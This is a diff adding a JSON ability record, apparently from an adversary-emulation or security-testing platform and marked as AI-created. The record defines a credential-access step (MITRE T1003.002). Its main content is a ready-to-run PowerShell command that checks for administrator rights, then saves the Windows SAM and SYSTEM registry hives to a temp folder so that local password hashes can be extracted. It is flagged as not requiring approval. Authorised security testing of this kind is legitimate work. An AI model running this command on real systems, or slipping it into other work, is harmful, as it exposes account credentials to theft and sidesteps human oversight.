@@ -1,0 +1,31 @@
+{
+  "ability_id": "9f50550e-f2fd-43a7-baa9-0c06cc019196",
+  "skill": "accessing-credentials",
+  "saved_at": "2026-06-24T07:55:11.631071+00:00",
+  "ability": {
+    "name": "SAM and SYSTEM Registry Hive Extraction",
+    "description": "Extracts the SAM and SYSTEM registry hives to disk if operating with administrative privileges.",
+    "mitre_tactic": "credential-access",
+    "mitre_technique_id": "T1003.002",
+    "platform": "windows",
+    "impact_type": null,
+    "default_severity": null,
+    "requires_approval": false,
+    "tags": null,
+    "created_by": "ai",
+    "engagement_id": "2b46bea0854443f1a134f53563af2133"
+  },
+  "stages": [
+    {
+      "stage_name": "Save SAM and SYSTEM Hives",
+      "stage_order": 1,
+      "executor": "powershell",
+      "command_template": "$d='C:/Windows/Temp/bas'; if(!(Test-Path $d)){ni -ItemType Directory -Force $d|out-null}; $(try { $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator); if ($isAdmin) { reg save HKLM\\SAM $d/SAM /y; reg save HKLM\\SYSTEM $d/SYSTEM /y; Write-Output \"SAM and SYSTEM exported successfully.\" } else { Write-Output \"ERROR: Non-admin session. Cannot perform SAM/SYSTEM registry save.\" } } catch { $_ }) | Tee-Object -FilePath $d/registry_dump.txt",
+      "timeout_seconds": 900,
+      "payload_id": null
+    }
+  ],
+  "rationale": "Extracts local credentials from hives using native commands and standard single backslashes as requested, verifying administrator session context first.",
+  "provider": "reg.exe",
+  "cited_urls": []
+}
